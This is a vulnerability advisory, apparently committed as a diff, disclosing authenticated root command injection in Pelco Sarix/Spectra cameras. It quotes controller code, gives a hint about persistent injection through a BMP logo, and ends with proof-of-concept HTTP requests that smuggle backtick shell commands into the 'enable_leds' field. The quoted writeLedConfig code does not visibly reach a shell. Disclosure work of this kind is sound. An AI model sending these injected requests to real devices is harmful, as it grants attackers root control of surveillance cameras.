@@ -1,0 +1,191 @@
+Schneider Electric Pelco Sarix/Spectra Cameras Root Remote Code Execution
+
+
+Vendor: Schneider Electric SE
+Product web page: https://www.pelco.com
+Affected version: Sarix Enhanced - Model: IME219 (Firmware: 2.1.2.0.8280-A0.0)
+                  Sarix Enhanced - Model: IME119 (Firmware: 2.1.2.0.8280-A0.0)
+                  Sarix - Model: D5230 (Firmware: 1.9.2.23-20141118-1.9330-A1.10722)
+                  Sarix - Model: ID10DN (Firmware: 1.8.2.18-20121109-1.9110-O3.8503)
+                  Spectra Enhanced - Model: D6230 (Firmware: 2.2.0.5.9340-A0.0)
+
+Summary: Pelco offers the broadest selection of IP cameras designed
+for security surveillance in a wide variety of commercial and industrial
+settings. From our industry-leading fixed and high-speed IP cameras to
+panoramic, thermal imaging, explosionproof and more, we offer a camera
+for any environment, any lighting condition and any application.
+When nothing but the best will do. Sarix™ Enhanced Range cameras
+provide the most robust feature-set for your mission-critical applications.
+With SureVision™ 3.0, Sarix Enhanced delivers the best possible image
+in difficult lighting conditions such as a combination of bright areas,
+shaded areas, and intense light. Designed with superior reliability,
+fault tolerance, and processing speed, these rugged fixed IP cameras
+ensure you always get the video that you need.
+
+Desc: The affected cameras suffer from authenticated remote code
+execution vulnerability. The POST parameter 'enable_leds' located
+in the update() function called via the GeneralSetupController.php
+script is not properly sanitised before being used in writeLedConfig()
+function to enable led state to on or off. A remote attacker can
+exploit this issue and execute arbitrary system commands granting
+her system access with root privileges using a specially crafted
+request and escape sequence to system shell.
+
+
+---------------------------------------------------------------------------
+/var/www/core/setup/controllers/GeneralSetupController.php:
+-----------------------------------------------------------
+
+43: public function update() {
+44:         $errOccurred = false;
+45:         $logoreboot = false;
+46: 
+47:         // If can update general settings
+48:         if ($this->_context->_user->hasPermission("{51510980-768b-4b26-a44a-2ae49f308184}")) {
+49:
+50:             $errors = $this->validateInputs("setup", "general.invalid");
+51:
+52: //
+53:             $new_logo_path;
+54:             if (empty($errors) && (strlen($_FILES["new_logo_path"]["name"]) > 0)) {
+55:                 // The user has provided a file to load in as an image.  Verify that the file is ok.
+56:                 $errors = $this->storeBmpFileIfValid($new_logo_path, $width, $height);
+57:             } else {
+58:                 // In this case, get the width and height from the omons settings
+59:                 $width = intval($this->_conf->get("Video/Overlay", "LogoWidth"));
+60:                 $height = intval($this->_conf->get("Video/Overlay", "LogoHeight"));
+61:             }
+62: //
+63:             if (empty($errors)) {
+64:                 $device_name = $_POST["device_name"];
+65:
+66:                 $this->_conf->set("Device", "FriendlyName", $device_name);
+67:
+68:                 // update smtp server; append port 25 if it's not provided by the user
+69:                 $smtpServer = $_POST["smtp_server"];
+70:
+71:                 if ((! empty($smtpServer)) && preg_match(self::kHostPortRegex, $smtpServer) == 0) {
+72:                     $smtpServer .= ":" . self::kDefaultSmtpPort;
+73:                 }
+74:
+75:                 $this->_conf->set("Networking", "SmtpServer", $smtpServer);
+76:
+77: //
+78:                 $success = $this->writeLedConfig($_POST["enable_leds"]);
+79: //
+80:             } else {
+81:                 $this->_context->setError("phobos", "validation.failure");
+82:                 $this->_context->setErrorList($errors);
+83:
+84:                 $errOccurred = true;
+85:             }
+86:         }
+
+...
+...
+...
+
+Bonus hint: When uploading a bmp logo, you can modify the width offset for example and inject persistent code:
+--
+-> 12h: 00 01 00 00 ; width (max 0x100, min 0x20)
+--
+191:             if ($logoOverlay) {
+192:                 if($logoreboot) {
+193:                     $cmd = "/usr/bin/overlayLogo " . $logo_justification . " " . $logo_row . " " . $width  . " " .  $height . " 0";
+194:                     exec($cmd);
+195:                 }
+196:             } else {                
+197:                 $cmd = "/usr/bin/overlayLogo 1 1 1 1 1";
+198:                 exec($cmd);
+199:             }                
+
+...
+...
+...
+
+265:         $vparams["enable_leds"] = $this->getLedConfig();
+266: //
+267:         $vparams["device_name"]  = $this->_conf->get("Device", "FriendlyName");
+268:         $vparams["TimeFormat"] = $this->_conf->get("Video/Overlay", "TimeFormat");        
+269:         $vparams["date_formats"] = $this->getDateFormats();
+270:         $vparams["selectedDateFormat"] = $this->_conf->get("Video/Overlay", "DateFormat");
+271:
+272:         ob_start();
+273:         passthru("date +\"" . $vparams["TimeFormat"] . "\"");
+274:         $vparams["current_time"] = trim(ob_get_contents());
+275:         ob_end_clean();
+
+...
+...
+...
+
+630:     /** @param $state string "on" or "off" */
+631:     protected function writeLedConfig($state) {
+632:         $encoded = array('type' => 'uint32',
+633:             'value' => ($state == 'on' ? 1 : 0));
+634:
+635:         $rest = $this->getRestProxy();
+636:         $params = array(array('type' => 'uint32', 'value' => 10), $encoded);
+637:         $response = $rest->GetWithPayload('/internal/msgbus/com.pelco.hardware.led/SetState?',
+638:                                'application/json',
+639:                                $params);
+640:
+641:         return ($response->GetStatus() == 200);
+642:     }
+
+---------------------------------------------------------------------------
+
+
+Tested on: Linux 2.6.10_mvl401-1721-pelco_evolution #1 Tue Nov 18 21:15:30 EST 2014 armv5tejl unknown
+           MontaVista(R) Linux(R) Professional Edition 4.0.1 (0600980)
+           Lighttpd/1.4.28
+           PHP/5.3.0
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5417
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5417.php
+
+
+07.04.2017
+
+--
+
+
+PoC sleep 17s:
+
+POST /setup/system/general/update HTTP/1.1
+Host: 192.168.1.1
+Content-Length: x
+Cache-Control: max-age=0
+Origin: http://192.168.1.1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Referer: http://192.168.1.1/setup/system/general
+Accept-Language: en-US,en;q=0.8,mk;q=0.6
+Cookie: PHPSESSID=p2ooorb7gloavc0et2stj2tnn4; authos-token=07E14CAF; svcts=1495616826
+Connection: close
+
+device_name=ZSL&enable_leds=%60sleep%2017%60&smtp_server=&ntp_server_from_dhcp=false&ntp_server=time.nist.gov&region=Universe&zone=Earth&enable_time_overlay=on&enable_name_overlay=off&position=topright&date_format=0
+
+===
+
+PoC echo:
+
+POST /setup/system/general/update HTTP/1.1
+Host: 192.168.1.1
+
+enable_leds=%60echo%20251%20>test.html%60
+
+--
+
+GET http://192.168.1.1/test.html HTTP/1.1
+
+Response:
+
+251
